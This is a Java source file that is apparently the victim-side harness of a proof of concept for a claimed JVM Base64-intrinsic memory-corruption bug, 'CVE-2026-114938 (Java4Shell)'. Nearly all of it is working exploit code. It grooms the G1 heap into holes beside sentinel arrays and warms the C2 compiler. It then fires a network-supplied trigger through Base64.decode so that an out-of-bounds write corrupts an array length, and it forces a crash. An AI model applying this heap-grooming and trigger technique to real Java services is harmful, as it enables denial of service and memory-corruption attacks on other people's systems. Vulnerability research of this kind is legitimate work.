package com.aweimc.j4shell;

import java.lang.management.GarbageCollectorMXBean;
import java.lang.management.ManagementFactory;
import java.util.Base64;

/**
 * Deterministic-DoS victim core for CVE-2026-114938 (Java4Shell).
 *
 * Key property: the two-argument overload decode(byte[], byte[]) is NEVER used as
 * the weapon. The only "firing" API is the ubiquitous single-argument
 * decode(byte[]) - the entry point real applications use for HTTP Basic headers,
 * tokens and uploads - executed TWICE in a row:
 *
 *   Shot #1: the trigger length len = 64k+1 is tuned so dst (~2 G1 regions,
 *     region-aligned, no TLAB randomness) fills a hole left by eager-reclaim;
 *     the intrinsic's fixed 64-byte store deterministically crosses the region
 *     boundary by 32 bytes into the sentinel row placed right after the hole.
 *     If the sentinel row length field is corrupted, we force an out-of-bounds
 *     read -> SIGSEGV + hs_err (clean forensic chain).
 *     If it misses (rare), dst1 becomes a dead humongous object and the next
 *     young GC eager-reclaims it back into a hole.
 *
 *   Shot #2: re-warm C2 (the intrinsic fires only once per compiled version -
 *   it deoptimizes after the trigger via uncommon trap), then fire again with
 *   the same deterministic geometry.
 *
 * Heap layout (a full GC is NEVER performed - compaction would rearrange the
 * layout and destroy the holes):
 *
 *   [recvBuf 2 regions (pinned live)][row0 1 region][filler0 2 regions][row1][filler1]...
 *
 * Sentinel rows are byte[R-16] (exactly 1 region each, zero-filled). Releasing
 * all fillers and forcing a young GC turns each filler into a 2-region hole
 * with a sentinel row immediately after it - so no matter which hole the
 * trigger dst fills, the 32-byte crossing always lands on a sentinel header.
 */
public final class DualDecodeVictim {

    static volatile Object keepAlive;   // keeps pad allocations alive

    private final Base64.Decoder dec = Base64.getDecoder();
    private final int warm;             // valid decodes per (re)fill of C2
    private final int gridMb;           // total grid size (cells = gridMb/3)
    private final int shots;            // consecutive single-arg decode firings (default 2)

    private byte[][] rowsB;             // sentinel rows: byte[R-16], one region each, all zero
    private byte[] recvBuf;             // network receive buffer (pre-allocated before layout)
    private int expectRowBytes;
    private int triggerLen = -1;
    private int regionSize = -1;
    private boolean armed = false;
    private boolean probed = false;     // layer-1 self-check passed

    public DualDecodeVictim(int warm, int gridMb, int shots) {
        this.warm = warm;
        this.gridMb = gridMb;
        this.shots = Math.max(1, shots);
    }

    // ---------- arm: environment self-check + layout + C2 fill ----------

    public synchronized String arm() throws Exception {
        banner();
        regionSize = regionSizeBytes();
        triggerLen = humongousTriggerLen(regionSize);
        if (triggerLen < 0) {
            System.out.println("[victim] no deterministic crossing geometry found - environment unsupported");
            return "ERROR geometry-failed";
        }

        // Layer-1 self-check (bounded): uses len=129 only (non-humongous allocations, so the
        // humongous layout stays untouched). The two-arg overload serves purely as a DETECTOR
        // here - the spill stays inside an 8KB guard buffer and cannot touch the heap.
        // After the detector fires, decode0 is deoptimized and must be refilled.
        int oob = boundedSpillProbe();
        probed = oob > 0;
        System.out.printf("[victim] layer-1 self-check: spill=%s (oob=%dB beyond logical dst)%n",
                oob > 0 ? "REPRODUCED" : "none", oob);

        // Receive buffer first (2-region humongous, stays live forever), then the grid -
        // keeps the humongous address order stable.
        recvBuf = new byte[triggerLen];
        setupGrid(regionSize);
        warmDecode("initial");
        forceYoungGc("hole-formation");
        armed = true;
        return String.format(
                "ARMED java=%s intrinsics=%s region=%d rows=%d recvBuf=%d triggerLen=%d dst=%d obj=%d crossing=%dB probe=%s",
                System.getProperty("java.version"),
                vmFlag("UseBASE64Intrinsics"),
                regionSize, rowsB.length, recvBuf.length, triggerLen,
                Payload.logicalOut(triggerLen), Payload.logicalOut(triggerLen) + 16,
                crossingBytes(), probed ? "REPRODUCED" : "none");
    }

    // ---------- fire: two consecutive single-arg decodes ----------

    /** Fire result; lengthHit=true means a sentinel row length field was corrupted (crash forceable). */
    public static final class FireResult {
        public final boolean hit;
        public final int shot;
        public final int rowIndex;
        public final int oldLen, newLen;
        public final boolean lengthHit;
        FireResult(boolean hit, int shot, int rowIndex, int oldLen, int newLen, boolean lengthHit) {
            this.hit = hit; this.shot = shot; this.rowIndex = rowIndex;
            this.oldLen = oldLen; this.newLen = newLen; this.lengthHit = lengthHit;
        }
        static FireResult survived(int shots) { return new FireResult(false, shots, -1, 0, 0, false); }
    }

    /**
     * Fire {@code shots} consecutive single-arg decode(byte[]) calls. {@code src} must be
     * the network-received trigger. Returns hit info; on lengthHit the caller should reply
     * to the client FIRST, then call forceCrash() for a clean forensic chain.
     */
    public synchronized FireResult fire(byte[] src) throws Exception {
        if (!armed) throw new IllegalStateException("not armed");
        if (src.length != triggerLen) {
            throw new IllegalArgumentException("src len=" + src.length + " expect " + triggerLen);
        }
        for (int shot = 1; shot <= shots; shot++) {
            if (shot > 1) {
                // dst1 is dead now: young GC eager-reclaim turns it back into a hole,
                // then refill C2 (one shot per compiled version).
                forceYoungGc("between-shots");
                warmDecode("rewarm-shot-" + shot);
            }
            try {
                dec.decode(src);                    // the ONLY firing API: single-arg decode(byte[])
            } catch (IllegalArgumentException expected) {
                // write happens before the exception - corruption already occurred
            }
            int li = scanLengthCorruption();
            if (li >= 0) {
                return new FireResult(true, shot, li, expectRowBytes, rowsB[li].length, true);
            }
            int di = scanDataCorruption();
            if (di >= 0) {
                System.out.printf("[victim] *** DATA CONTAMINATED *** shot=%d row=%d (header intact, JVM alive)%n",
                        shot, di);
                return new FireResult(true, shot, di, 0, 0, false);
            }
            System.out.printf("[victim] shot=%d fired, no corruption observed%n", shot);
        }
        return FireResult.survived(shots);
    }

    /** Forced forensic crash: after the length field is corrupted, an OOB read produces SIGSEGV + hs_err. */
    public void forceCrash(int row, int shot) {
        System.out.printf("[victim] *** LENGTH CORRUPTED *** shot=%d row=%d len %d -> %d (0x%08X)%n",
                shot, row, expectRowBytes, rowsB[row].length, rowsB[row].length);
        System.out.println("[victim] forcing hard crash via out-of-bounds read - hs_err follows");
        byte v = rowsB[row][rowsB[row].length - 1];   // OOB read -> SIGSEGV (never reaches next line on hit)
        System.out.println("[victim] read=" + v);
    }

    public int triggerLen() { return triggerLen; }
    public byte[] recvBuf() { return recvBuf; }
    public boolean isProbed() { return probed; }

    // ---------- internals ----------

    /**
     * Bounded probe: fixed len=129 (dst=98B, never humongous - any humongous allocation here
     * would leave an unpaired hole outside the layout and break determinism). Two-arg overload
     * with a dst oversized by 8KB keeps the spill inside the guard buffer - measurement only.
     */
    private int boundedSpillProbe() throws Exception {
        int len = 129;
        byte[] big = new byte[Payload.logicalOut(len) + 8192];
        byte[] src = Payload.trigger(len);
        for (int i = 0; i < warm; i++) keepAlive = dec.decode(Payload.validWarm());
        java.util.Arrays.fill(big, (byte) 0x5A);
        int logical = Payload.logicalOut(len);
        try { dec.decode(src, big); } catch (IllegalArgumentException expected) { }
        int changed = 0, first = -1;
        for (int i = logical; i < big.length; i++) {
            if (big[i] != 0x5A) { changed++; if (first < 0) first = i; }
        }
        if (changed > 0) {
            System.out.printf("[victim] probe detail: len=%d spill=[%d..%d) oob=%d fixed-value bytes%n",
                    len, first, first + changed, changed);
        }
        return changed;
    }

    /** Fill decode0 into C2 (synchronous under -Xbatch). Only single-arg decode is used here too. */
    private void warmDecode(String tag) throws Exception {
        byte[] warmSrc = Payload.validWarm();
        long t0 = System.currentTimeMillis();
        for (int i = 0; i < warm; i++) keepAlive = dec.decode(warmSrc);
        Thread.sleep(150);
        System.out.printf("[victim] warm(%s): %d valid single-arg decodes in %dms -> decode0 in C2%n",
                tag, warm, System.currentTimeMillis() - t0);
    }

    /** Humongous grid: [row 1 region][filler 2 regions] alternating, then release all fillers. */
    private void setupGrid(int R) {
        int rowBytes = R - 16;            // 16B array header -> exactly 1 region
        int fillerBytes = 2 * R - 16;     // exactly 2 regions
        int cells = Math.max(10, gridMb / 3);
        rowsB = new byte[cells][];
        byte[][] fillers = new byte[cells][];
        for (int i = 0; i < cells; i++) {
            rowsB[i] = new byte[rowBytes];
            fillers[i] = new byte[fillerBytes];
        }
        expectRowBytes = rowBytes;
        fillers = null;                   // release: next young GC eager-reclaim forms the holes
        System.out.printf("[victim] humongous grid: %d cells x (row 1 region + filler 2 regions) = %d MB%n",
                cells, (long) cells * 3 * R >> 20);
    }

    /**
     * Deterministically force a young GC via GarbageCollectorMXBean counters (never a full GC).
     * Pressure MUST use non-humongous small chunks (64KB < region/2 = 512KB): dead humongous
     * arrays would leave unpaired holes outside the layout and break the deterministic
     * landing of the trigger dst (measured pitfall from run #1).
     */
    private void forceYoungGc(String tag) {
        long before = youngGcCount();
        for (int i = 0; i < 4000 && youngGcCount() == before; i++) {
            keepAlive = new byte[64 << 10];
        }
        System.out.printf("[victim] young GC forced (%s): count %d -> %d%n",
                tag, before, youngGcCount());
    }

    private static long youngGcCount() {
        for (GarbageCollectorMXBean b : ManagementFactory.getGarbageCollectorMXBeans()) {
            if (b.getName() != null && b.getName().toLowerCase().contains("young")) {
                return b.getCollectionCount();
            }
        }
        return -1;
    }

    private int scanLengthCorruption() {
        for (int r = 0; r < rowsB.length; r++) {
            if (rowsB[r].length != expectRowBytes) return r;
        }
        return -1;
    }

    private int scanDataCorruption() {
        for (int r = 0; r < rowsB.length; r++) {
            for (int i = 0; i < 64; i++) {
                if (rowsB[r][i] != 0) return r;
            }
        }
        return -1;
    }

    /**
     * Trigger length for the humongous geometry: pick len = 64k+1 so that dst (= logicalOut)
     * satisfies  obj = dst+16 <= N*regionSize  (fits into N regions)  and
     * spillStart+64 > N*regionSize  (the 64-byte store crosses the region end).
     * The last {@code crossing} bytes of the spill then land DETERMINISTICALLY in the
     * next region - the sentinel row after the hole.
     */
    private int humongousTriggerLen(int R) {
        for (int n = 2; n <= 8; n++) {
            long k = ((long) n * R - 18) / 48;
            if (k < 1) continue;
            long crossing = 48 * k + 64 - (long) n * R;
            if (crossing > 0) {
                int len = (int) (64 * k + 1);
                System.out.printf("[victim] humongous geometry: region=%dB n=%d k=%d len=%d dst=%dB obj=%dB -> crossing=%dB (deterministic)%n",
                        R, n, k, len, Payload.logicalOut(len), Payload.logicalOut(len) + 16, crossing);
                return len;
            }
        }
        return -1;
    }

    private int crossingBytes() {
        long k = (triggerLen - 1) / 64;
        for (int n = 2; n <= 8; n++) {
            if ((long) k * 48 + 18 <= (long) n * regionSize) {
                return (int) (48 * k + 64 - (long) n * regionSize);
            }
        }
        return -1;
    }

    private int regionSizeBytes() {
        try {
            com.sun.management.HotSpotDiagnosticMXBean bean =
                    ManagementFactory.getPlatformMXBean(com.sun.management.HotSpotDiagnosticMXBean.class);
            return Integer.parseInt(bean.getVMOption("G1HeapRegionSize").getValue());
        } catch (Exception e) {
            return 1 << 20;
        }
    }

    private static String vmFlag(String name) {
        try {
            com.sun.management.HotSpotDiagnosticMXBean bean =
                    ManagementFactory.getPlatformMXBean(com.sun.management.HotSpotDiagnosticMXBean.class);
            return bean.getVMOption(name).getValue();
        } catch (Throwable t) {
            return "<n/a>";
        }
    }

    private void banner() {
        System.out.println("=== J4Shell-Deterministic-DoS victim (CVE-2026-114938 derivative) ===");
        System.out.println("java.version    = " + System.getProperty("java.version"));
        System.out.println("os.arch         = " + System.getProperty("os.arch"));
        System.out.printf("%-18s = %s%n", "UseBASE64Intrinsics", vmFlag("UseBASE64Intrinsics"));
        System.out.printf("%-18s = %s%n", "UseAVX", vmFlag("UseAVX"));
        System.out.printf("%-18s = %s%n", "G1HeapRegionSize", vmFlag("G1HeapRegionSize"));
        System.out.printf("%-18s = %s%n", "MaxHeapSize", vmFlag("MaxHeapSize"));
        System.out.printf("%-18s = %s%n", "warm / grid / shots", warm + " / " + gridMb + "MB / " + shots);
        System.out.println();
    }
}
